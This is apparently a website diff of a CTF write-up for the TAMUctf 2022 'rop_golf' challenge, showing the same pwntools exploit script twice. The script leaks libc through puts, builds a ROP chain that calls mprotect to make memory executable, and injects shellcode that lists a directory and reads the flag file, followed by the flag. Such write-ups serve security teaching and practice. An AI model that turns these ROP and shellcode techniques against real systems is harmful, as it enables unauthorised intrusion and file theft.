-        return gdb.debug([exe.path] + argv, gdbscript&#x3D;gdbscript, *a, **kw)
-    else:
-        return process([exe.path] + argv, *a, **kw)
-
-
-def start_remote(argv&#x3D;[], *a, **kw):
-    &#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;
-    io &#x3D; remote(&quot;tamuctf.com&quot;, 443, ssl&#x3D;True, sni&#x3D;&quot;rop-golf&quot;)
-    if args.GDB:
-        gdb.attach(io, gdbscript&#x3D;gdbscript)
-    return io
-
-
-def start(argv&#x3D;[], *a, **kw):
-    &#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;
-    if args.LOCAL:
-        return start_local(argv, *a, **kw)
-    else:
-        return start_remote(argv, *a, **kw)
-
-
-# &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
-#                    EXPLOIT GOES HERE
-# &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
-    # Arch:     amd64-64-little
-    # RELRO:    Partial RELRO
-    # Stack:    No canary found
-    # NX:       NX enabled
-    # PIE:      No PIE (0x400000)
-
-# Specify your GDB script here for debugging
-# GDB will be launched if the exploit is run via e.g.
-# .&#x2F;exploit.py GDB
-gdbscript &#x3D; &#39;&#39;&#39;
-tbreak main
-continue
-&#39;&#39;&#39;.format(**locals())
-
-
-def log_print(*msg):
-    log.info(&quot; &quot;.join(map(str,msg)))
-
-
-def int2byte(x: int):
-    return x.to_bytes(exe.bytes, &quot;little&quot;)
-
-
-def wait_for_debugger(io):
-    if args.LOCAL and input(&quot;debugger?&quot;) &#x3D;&#x3D; &quot;y\n&quot;:
-        pid &#x3D; util.proc.pidof(io)[0]
-        log_print(&quot;The pid is: &quot; + str(pid))
-        util.proc.wait_for_debugger(pid)
-        log_print(&quot;press enter to continue&quot;)
-
-ret_addr &#x3D; exe_rop.find_gadget([&#39;ret&#39;])[0]
-pop_rdi_ret_addr &#x3D; exe_rop.find_gadget([&#39;pop rdi&#39;, &#39;ret&#39;])[0]
-
-io &#x3D; start()
-wait_for_debugger(io)
-
-writable_addr &#x3D; 0x0000000000404800
-
-rop_1 &#x3D; flat(&#123;
-    32: b&#39;00000000&#39;,
-    32+8: [
-        pop_rdi_ret_addr,
-        exe.got[&#39;puts&#39;],
-        exe.sym[&quot;puts&quot;],
-        exe.sym[&quot;vuln&quot;]
-    ]
-&#125;)
-
-log_print(&quot;pop rdi ret&quot;,hex(pop_rdi_ret_addr))
-
-io.sendafter(b&quot;hi!\n&quot;,rop_1)
-puts_addr &#x3D; int.from_bytes(io.recvuntil(b&#39;\n&#39;,drop&#x3D;True),&quot;little&quot;)
-log_print(&quot;puts addr&quot;,hex(puts_addr))
-libc_base_addr &#x3D; puts_addr - libc.sym[&quot;puts&quot;]
-log_print(&quot;libc base addr&quot;,hex(libc_base_addr))
-
-log_print(next(libc.search(b&quot;%p\0&quot;)))
-log_print(&quot;bin sh&quot;,hex(libc_base_addr + next(libc.search(b&quot;.\0&quot;))))
-
-log_print(libc.sym[&quot;opendir&quot;])
-
-log_print(&quot;mprotect&quot;,libc.sym[&quot;mprotect&quot;])
-
-pop_rsi_ret_addr &#x3D; libc_base_addr + libc_rop.find_gadget([&#39;pop rsi&#39;, &#39;ret&#39;])[0]
-pop_rdx_ret_addr &#x3D; libc_base_addr + libc_rop.find_gadget([&#39;pop rdx&#39;, &#39;ret&#39;])[0]
-leave_ret_addr &#x3D; libc_base_addr + libc_rop.find_gadget([&#39;leave&#39;, &#39;ret&#39;])[0]
-mov_rdx_rax_ret_addr &#x3D; libc_base_addr + 0x0000000000115dff
-push_rdx_ret_addr &#x3D; libc_base_addr + 0x0000000000117171
-add_rax_1_ret_addr &#x3D; libc_base_addr + 0x00000000000b4a00
-add_rax_3_ret_addr &#x3D; libc_base_addr + 0x00000000000b4a10
-
-log_print(&quot;pop rsi ret&quot;,hex(pop_rsi_ret_addr))
-log_print(&quot;pop rdx ret&quot;,hex(pop_rdx_ret_addr))
-log_print(&quot;leave ret&quot;,hex(leave_ret_addr))
-
-rop_2 &#x3D; flat(&#123;
-    32+8: [
-        pop_rdx_ret_addr,
-        0x200,
-        exe.sym[&quot;read&quot;],
-    ]
-&#125;)
-io.send(rop_2)
-shellcode_mov_rdi_rax_ret &#x3D; asm(shellcraft.mov(&quot;rdi&quot;,&quot;rax&quot;))+asm(shellcraft.ret())
-mov_rdi_rax_ret_addr &#x3D; writable_addr
-
-shellcode_mov_r15_rdi_ret &#x3D; asm(shellcraft.mov(&quot;r15&quot;,&quot;rdi&quot;))+asm(shellcraft.ret())
-mov_r15_rdi_ret_addr &#x3D; mov_rdi_rax_ret_addr + len(shellcode_mov_rdi_rax_ret)
-
-shellcode_mov_rdi_r15_ret &#x3D; asm(shellcraft.mov(&quot;rdi&quot;,&quot;r15&quot;))+asm(shellcraft.ret())
-mov_rdi_r15_ret_addr &#x3D; mov_r15_rdi_ret_addr + len(shellcode_mov_r15_rdi_ret)
-
-shellcode_add_rax_19_ret &#x3D; bytes.fromhex(&quot;4883c013c3&quot;)
-add_rax_19_ret_addr &#x3D; mov_rdi_r15_ret_addr + len(shellcode_mov_rdi_r15_ret)
-
-shellcode_read_file &#x3D; b&#39;&#39;.join([
-    asm(shellcraft.read(0, writable_addr+0x100, 100)),
-    asm(shellcraft.open(writable_addr+0x100, 0)),
-    asm(shellcraft.read(&#39;rax&#39;, writable_addr+0x100, 100)),
-    asm(shellcraft.write(1, writable_addr+0x100, 100))])
-
-read_file_addr &#x3D; add_rax_19_ret_addr + len(shellcode_add_rax_19_ret)
-
-flag_file_name &#x3D; b&quot;066A2462DEB399BA9183A91FC116914C.txt&quot;
-
-# log_print(hex(mov_rdi_rax_ret_addr),hex(mov_rdx_rdi_ret_addr),hex(mov_rdi_rdx_ret_addr))
-final_shellcodes &#x3D; shellcode_mov_rdi_rax_ret+shellcode_mov_r15_rdi_ret+shellcode_mov_rdi_r15_ret + shellcode_add_rax_19_ret + shellcode_read_file
-
-
-
-
-rop_3 &#x3D; flat(&#123;
-    32+8: [
-        b&#39;AAAAAAAA&#39;,
-        b&#39;BBBBBBBB&#39;,
-        b&#39;CCCCCCCC&#39;,
-        # make it rwx
-        pop_rdi_ret_addr,
-        0x0000000000404000,
-        pop_rsi_ret_addr,
-        0x1000,
-        pop_rdx_ret_addr,
-        1|2|4,
-        libc_base_addr + libc.sym[&quot;mprotect&quot;],
-        # writing some gadget
-        pop_rdi_ret_addr,
-        0,
-        pop_rsi_ret_addr,
-        writable_addr,
-        pop_rdx_ret_addr,
-        0x100,
-        exe.sym[&quot;read&quot;],
-        # print first filename
-        pop_rdi_ret_addr,
-        libc_base_addr + next(libc.search(b&quot;.\0&quot;)),
-        libc_base_addr + libc.sym[&quot;opendir&quot;],
-        mov_rdi_rax_ret_addr,
-        mov_r15_rdi_ret_addr,
-        libc_base_addr + libc.sym[&quot;readdir&quot;],
-        add_rax_19_ret_addr,
-        mov_rdi_rax_ret_addr,
-        exe.sym[&quot;puts&quot;],
-        mov_rdi_r15_ret_addr,
-        libc_base_addr + libc.sym[&quot;readdir&quot;],
-        add_rax_19_ret_addr,
-        mov_rdi_rax_ret_addr,
-        exe.sym[&quot;puts&quot;],
-        mov_rdi_r15_ret_addr,
-        libc_base_addr + libc.sym[&quot;readdir&quot;],
-        add_rax_19_ret_addr,
-        mov_rdi_rax_ret_addr,
-        exe.sym[&quot;puts&quot;],
-        mov_rdi_r15_ret_addr,
-        libc_base_addr + libc.sym[&quot;readdir&quot;],
-        add_rax_19_ret_addr,
-        mov_rdi_rax_ret_addr,
-        exe.sym[&quot;puts&quot;],
-        # mov_rdi_r15_ret_addr,
-        # libc_base_addr + libc.sym[&quot;readdir&quot;],
-        # add_rax_19_ret_addr,
-        # mov_rdi_rax_ret_addr,
-        # exe.sym[&quot;puts&quot;],
-        read_file_addr
-    ]
-&#125;)
-# input(&quot;asdf&quot;)
-io.send(rop_3)
-# input(&quot;writing gadgets&quot;)
-io.send(final_shellcodes)
-# input(&quot;lol&quot;)
-log_print(&quot;filenames&quot;,io.recv())
-io.send(flag_file_name)
-log_print(io.recv())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>gigem{r34lly_p1v071n6_7h47_574ck}</p>
-
-      </div>
-      
-      
-      
-    </div>
-  <ul class="breadcrumb">
-            <li><a href="/ctf-writeup/">CTF-WRITEUP</a></li>
-            <li><a href="/ctf-writeup/2022/">2022</a></li>
-            <li><a href="/ctf-writeup/2022/tamuctf/">TAMUCTF</a></li>
-            <li><a href="/ctf-writeup/2022/tamuctf/pwn/">PWN</a></li>
-          <li>ROP_GOLF</li>
-  </ul>
-
-    
-    
-
-
-</div>
-  </main>
-
-  <footer class="footer">
-    <div class="footer-inner">
-
-  <div class="copyright">
-    &copy; 
-    <span itemprop="copyrightYear">2026</span>
-    <span class="with-love">
-      <i class="fa fa-heart"></i>
-    </span>
-    <span class="author" itemprop="copyrightHolder">Aynakeya</span>
-  </div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
-  </div>
-
-    </div>
-  </footer>
-
-  
-  <div class="toggle sidebar-toggle" role="button">
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-  </div>
-  <div class="sidebar-dimmer"></div>
-  <div class="back-to-top" role="button" aria-label="Back to top">
-    <i class="fa fa-arrow-up fa-lg"></i>
-    <span>0%</span>
-  </div>
-
-<noscript>
-  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
-</noscript>
-
-</body>
-</html>
+<p><a id="0x3-Exploit"></a></p>
+<h1 id="0x3-exploit">0x3 Exploit</h1>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>from pwn import *</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>class BinaryInfo:</span></span>
+<span class="line"><span>    exe = "rop_golf_patched"</span></span>
+<span class="line"><span>    libc = "libc.so.6"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    host = "rua.host.goes.here"</span></span>
+<span class="line"><span>    port = 8000</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Set up pwntools for the correct architecture</span></span>
+<span class="line"><span>exe = context.binary = ELF(BinaryInfo.exe)</span></span>
+<span class="line"><span>exe_rop = ROP(exe)</span></span>
+<span class="line"><span>if BinaryInfo.libc != "":</span></span>
+<span class="line"><span>    libc = ELF(BinaryInfo.libc)</span></span>
+<span class="line"><span>    libc_rop = ROP(libc)</span></span>
+<span class="line"><span>else:</span></span>
+<span class="line"><span>    libc = None</span></span>
+<span class="line"><span>    libc_rop = None</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Many built-in settings can be controlled on the command-line and show up</span></span>
+<span class="line"><span># in "args".  For example, to dump all data sent/received, and disable ASLR</span></span>
+<span class="line"><span># for all created processes...</span></span>
+<span class="line"><span># ./exploit.py DEBUG NOASLR</span></span>
+<span class="line"><span># ./exploit.py GDB HOST=example.com PORT=4141</span></span>
+<span class="line"><span>host = args.HOST or BinaryInfo.host</span></span>
+<span class="line"><span>port = int(args.PORT or BinaryInfo.port)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def start_local(argv=[], *a, **kw):</span></span>
+<span class="line"><span>    '''Execute the target binary locally'''</span></span>
+<span class="line"><span>    if args.GDB:</span></span>
+<span class="line"><span>        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span></span>
+<span class="line"><span>    else:</span></span>
+<span class="line"><span>        return process([exe.path] + argv, *a, **kw)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def start_remote(argv=[], *a, **kw):</span></span>
+<span class="line"><span>    '''Connect to the process on the remote host'''</span></span>
+<span class="line"><span>    io = remote("tamuctf.com", 443, ssl=True, sni="rop-golf")</span></span>
+<span class="line"><span>    if args.GDB:</span></span>
+<span class="line"><span>        gdb.attach(io, gdbscript=gdbscript)</span></span>
+<span class="line"><span>    return io</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def start(argv=[], *a, **kw):</span></span>
+<span class="line"><span>    '''Start the exploit against the target.'''</span></span>
+<span class="line"><span>    if args.LOCAL:</span></span>
+<span class="line"><span>        return start_local(argv, *a, **kw)</span></span>
+<span class="line"><span>    else:</span></span>
+<span class="line"><span>        return start_remote(argv, *a, **kw)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># ===========================================================</span></span>
+<span class="line"><span>#                    EXPLOIT GOES HERE</span></span>
+<span class="line"><span># ===========================================================</span></span>
+<span class="line"><span>    # Arch:     amd64-64-little</span></span>
+<span class="line"><span>    # RELRO:    Partial RELRO</span></span>
+<span class="line"><span>    # Stack:    No canary found</span></span>
+<span class="line"><span>    # NX:       NX enabled</span></span>
+<span class="line"><span>    # PIE:      No PIE (0x400000)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Specify your GDB script here for debugging</span></span>
+<span class="line"><span># GDB will be launched if the exploit is run via e.g.</span></span>
+<span class="line"><span># ./exploit.py GDB</span></span>
+<span class="line"><span>gdbscript = '''</span></span>
+<span class="line"><span>tbreak main</span></span>
+<span class="line"><span>continue</span></span>
+<span class="line"><span>'''.format(**locals())</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def log_print(*msg):</span></span>
+<span class="line"><span>    log.info(" ".join(map(str,msg)))</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def int2byte(x: int):</span></span>
+<span class="line"><span>    return x.to_bytes(exe.bytes, "little")</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def wait_for_debugger(io):</span></span>
+<span class="line"><span>    if args.LOCAL and input("debugger?") == "y\n":</span></span>
+<span class="line"><span>        pid = util.proc.pidof(io)[0]</span></span>
+<span class="line"><span>        log_print("The pid is: " + str(pid))</span></span>
+<span class="line"><span>        util.proc.wait_for_debugger(pid)</span></span>
+<span class="line"><span>        log_print("press enter to continue")</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>ret_addr = exe_rop.find_gadget(['ret'])[0]</span></span>
+<span class="line"><span>pop_rdi_ret_addr = exe_rop.find_gadget(['pop rdi', 'ret'])[0]</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>io = start()</span></span>
+<span class="line"><span>wait_for_debugger(io)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>writable_addr = 0x0000000000404800</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>rop_1 = flat({</span></span>
+<span class="line"><span>    32: b'00000000',</span></span>
+<span class="line"><span>    32+8: [</span></span>
+<span class="line"><span>        pop_rdi_ret_addr,</span></span>
+<span class="line"><span>        exe.got['puts'],</span></span>
+<span class="line"><span>        exe.sym["puts"],</span></span>
+<span class="line"><span>        exe.sym["vuln"]</span></span>
+<span class="line"><span>    ]</span></span>
+<span class="line"><span>})</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>log_print("pop rdi ret",hex(pop_rdi_ret_addr))</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>io.sendafter(b"hi!\n",rop_1)</span></span>
+<span class="line"><span>puts_addr = int.from_bytes(io.recvuntil(b'\n',drop=True),"little")</span></span>
+<span class="line"><span>log_print("puts addr",hex(puts_addr))</span></span>
+<span class="line"><span>libc_base_addr = puts_addr - libc.sym["puts"]</span></span>
+<span class="line"><span>log_print("libc base addr",hex(libc_base_addr))</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>log_print(next(libc.search(b"%p\0")))</span></span>
+<span class="line"><span>log_print("bin sh",hex(libc_base_addr + next(libc.search(b".\0"))))</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>log_print(libc.sym["opendir"])</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>log_print("mprotect",libc.sym["mprotect"])</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>pop_rsi_ret_addr = libc_base_addr + libc_rop.find_gadget(['pop rsi', 'ret'])[0]</span></span>
+<span class="line"><span>pop_rdx_ret_addr = libc_base_addr + libc_rop.find_gadget(['pop rdx', 'ret'])[0]</span></span>
+<span class="line"><span>leave_ret_addr = libc_base_addr + libc_rop.find_gadget(['leave', 'ret'])[0]</span></span>
+<span class="line"><span>mov_rdx_rax_ret_addr = libc_base_addr + 0x0000000000115dff</span></span>
+<span class="line"><span>push_rdx_ret_addr = libc_base_addr + 0x0000000000117171</span></span>
+<span class="line"><span>add_rax_1_ret_addr = libc_base_addr + 0x00000000000b4a00</span></span>
+<span class="line"><span>add_rax_3_ret_addr = libc_base_addr + 0x00000000000b4a10</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>log_print("pop rsi ret",hex(pop_rsi_ret_addr))</span></span>
+<span class="line"><span>log_print("pop rdx ret",hex(pop_rdx_ret_addr))</span></span>
+<span class="line"><span>log_print("leave ret",hex(leave_ret_addr))</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>rop_2 = flat({</span></span>
+<span class="line"><span>    32+8: [</span></span>
+<span class="line"><span>        pop_rdx_ret_addr,</span></span>
+<span class="line"><span>        0x200,</span></span>
+<span class="line"><span>        exe.sym["read"],</span></span>
+<span class="line"><span>    ]</span></span>
+<span class="line"><span>})</span></span>
+<span class="line"><span>io.send(rop_2)</span></span>
+<span class="line"><span>shellcode_mov_rdi_rax_ret = asm(shellcraft.mov("rdi","rax"))+asm(shellcraft.ret())</span></span>
+<span class="line"><span>mov_rdi_rax_ret_addr = writable_addr</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>shellcode_mov_r15_rdi_ret = asm(shellcraft.mov("r15","rdi"))+asm(shellcraft.ret())</span></span>
+<span class="line"><span>mov_r15_rdi_ret_addr = mov_rdi_rax_ret_addr + len(shellcode_mov_rdi_rax_ret)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>shellcode_mov_rdi_r15_ret = asm(shellcraft.mov("rdi","r15"))+asm(shellcraft.ret())</span></span>
+<span class="line"><span>mov_rdi_r15_ret_addr = mov_r15_rdi_ret_addr + len(shellcode_mov_r15_rdi_ret)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>shellcode_add_rax_19_ret = bytes.fromhex("4883c013c3")</span></span>
+<span class="line"><span>add_rax_19_ret_addr = mov_rdi_r15_ret_addr + len(shellcode_mov_rdi_r15_ret)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>shellcode_read_file = b''.join([</span></span>
+<span class="line"><span>    asm(shellcraft.read(0, writable_addr+0x100, 100)),</span></span>
+<span class="line"><span>    asm(shellcraft.open(writable_addr+0x100, 0)),</span></span>
+<span class="line"><span>    asm(shellcraft.read('rax', writable_addr+0x100, 100)),</span></span>
+<span class="line"><span>    asm(shellcraft.write(1, writable_addr+0x100, 100))])</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>read_file_addr = add_rax_19_ret_addr + len(shellcode_add_rax_19_ret)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>flag_file_name = b"066A2462DEB399BA9183A91FC116914C.txt"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># log_print(hex(mov_rdi_rax_ret_addr),hex(mov_rdx_rdi_ret_addr),hex(mov_rdi_rdx_ret_addr))</span></span>
+<span class="line"><span>final_shellcodes = shellcode_mov_rdi_rax_ret+shellcode_mov_r15_rdi_ret+shellcode_mov_rdi_r15_ret + shellcode_add_rax_19_ret + shellcode_read_file</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>rop_3 = flat({</span></span>
+<span class="line"><span>    32+8: [</span></span>
+<span class="line"><span>        b'AAAAAAAA',</span></span>
+<span class="line"><span>        b'BBBBBBBB',</span></span>
+<span class="line"><span>        b'CCCCCCCC',</span></span>
+<span class="line"><span>        # make it rwx</span></span>
+<span class="line"><span>        pop_rdi_ret_addr,</span></span>
+<span class="line"><span>        0x0000000000404000,</span></span>
+<span class="line"><span>        pop_rsi_ret_addr,</span></span>
+<span class="line"><span>        0x1000,</span></span>
+<span class="line"><span>        pop_rdx_ret_addr,</span></span>
+<span class="line"><span>        1|2|4,</span></span>
+<span class="line"><span>        libc_base_addr + libc.sym["mprotect"],</span></span>
+<span class="line"><span>        # writing some gadget</span></span>
+<span class="line"><span>        pop_rdi_ret_addr,</span></span>
+<span class="line"><span>        0,</span></span>
+<span class="line"><span>        pop_rsi_ret_addr,</span></span>
+<span class="line"><span>        writable_addr,</span></span>
+<span class="line"><span>        pop_rdx_ret_addr,</span></span>
+<span class="line"><span>        0x100,</span></span>
+<span class="line"><span>        exe.sym["read"],</span></span>
+<span class="line"><span>        # print first filename</span></span>
+<span class="line"><span>        pop_rdi_ret_addr,</span></span>
+<span class="line"><span>        libc_base_addr + next(libc.search(b".\0")),</span></span>
+<span class="line"><span>        libc_base_addr + libc.sym["opendir"],</span></span>
+<span class="line"><span>        mov_rdi_rax_ret_addr,</span></span>
+<span class="line"><span>        mov_r15_rdi_ret_addr,</span></span>
+<span class="line"><span>        libc_base_addr + libc.sym["readdir"],</span></span>
+<span class="line"><span>        add_rax_19_ret_addr,</span></span>
+<span class="line"><span>        mov_rdi_rax_ret_addr,</span></span>
+<span class="line"><span>        exe.sym["puts"],</span></span>
+<span class="line"><span>        mov_rdi_r15_ret_addr,</span></span>
+<span class="line"><span>        libc_base_addr + libc.sym["readdir"],</span></span>
+<span class="line"><span>        add_rax_19_ret_addr,</span></span>
+<span class="line"><span>        mov_rdi_rax_ret_addr,</span></span>
+<span class="line"><span>        exe.sym["puts"],</span></span>
+<span class="line"><span>        mov_rdi_r15_ret_addr,</span></span>
+<span class="line"><span>        libc_base_addr + libc.sym["readdir"],</span></span>
+<span class="line"><span>        add_rax_19_ret_addr,</span></span>
+<span class="line"><span>        mov_rdi_rax_ret_addr,</span></span>
+<span class="line"><span>        exe.sym["puts"],</span></span>
+<span class="line"><span>        mov_rdi_r15_ret_addr,</span></span>
+<span class="line"><span>        libc_base_addr + libc.sym["readdir"],</span></span>
+<span class="line"><span>        add_rax_19_ret_addr,</span></span>
+<span class="line"><span>        mov_rdi_rax_ret_addr,</span></span>
+<span class="line"><span>        exe.sym["puts"],</span></span>
+<span class="line"><span>        # mov_rdi_r15_ret_addr,</span></span>
+<span class="line"><span>        # libc_base_addr + libc.sym["readdir"],</span></span>
+<span class="line"><span>        # add_rax_19_ret_addr,</span></span>
+<span class="line"><span>        # mov_rdi_rax_ret_addr,</span></span>
+<span class="line"><span>        # exe.sym["puts"],</span></span>
+<span class="line"><span>        read_file_addr</span></span>
+<span class="line"><span>    ]</span></span>
+<span class="line"><span>})</span></span>
+<span class="line"><span># input("asdf")</span></span>
+<span class="line"><span>io.send(rop_3)</span></span>
+<span class="line"><span># input("writing gadgets")</span></span>
+<span class="line"><span>io.send(final_shellcodes)</span></span>
+<span class="line"><span># input("lol")</span></span>
+<span class="line"><span>log_print("filenames",io.recv())</span></span>
+<span class="line"><span>io.send(flag_file_name)</span></span>
+<span class="line"><span>log_print(io.recv())</span></span></code></pre>
+<p><a id="0x4-Flag"></a></p>
+<h1 id="0x4-flag">0x4 Flag</h1>
+<p>gigem{r34lly_p1v071n6_7h47_574ck}</p></div><footer class="ctf-back"><a href="/ctf-writeup/2022/tamuctf/">&larr; Tamu CTF 2022</a></footer></article></main><footer class="site-footer"><span>&copy; 2026 Aynakeya</span><div><a href="/rss.xml">RSS</a><a href="/blog/archives/">Archives</a><a href="#top">Back to top &uarr;</a></div></footer></div></div></body></html>
